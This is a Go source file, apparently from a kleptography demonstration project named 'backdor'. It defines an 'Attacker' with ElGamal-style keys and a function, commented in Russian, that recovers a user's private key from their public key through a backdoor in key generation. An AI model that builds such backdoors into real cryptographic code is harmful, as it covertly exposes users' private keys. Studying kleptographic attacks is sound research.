package internal

import (
	"backdor/utils"
	"math/big"
)

type Attacker struct {
	PrivateKey *big.Int
	PublicKey  *utils.PublicKey

	randomator *utils.Randomator
}

func NewAttacker(pr_key, p, g *big.Int, rm *utils.Randomator) *Attacker {
	res := &Attacker{
		PrivateKey: pr_key,
		PublicKey: &utils.PublicKey{
			P: p,
			G: g,
			Y: big.NewInt(0).Exp(g, pr_key, p),
		},
		randomator: rm,
	}
	return res
}

// Функция расшифрования закртытого ключа пользователя через бэкдор
func (u *Attacker) DecryptUserPrivateKey(pub_key *utils.PublicKey) *big.Int {
	c1 := u.randomator.RestoreG(pub_key.G, u.PublicKey.P)
	c2 := u.randomator.RestoreP(pub_key.P, u.PublicKey.P)

	res := big.NewInt(0).Exp(c1, u.PrivateKey, u.PublicKey.P)
	res.ModInverse(res, u.PublicKey.P)

	res.Mul(res, c2)
	res.Mod(res, u.PublicKey.P)

	return res
}
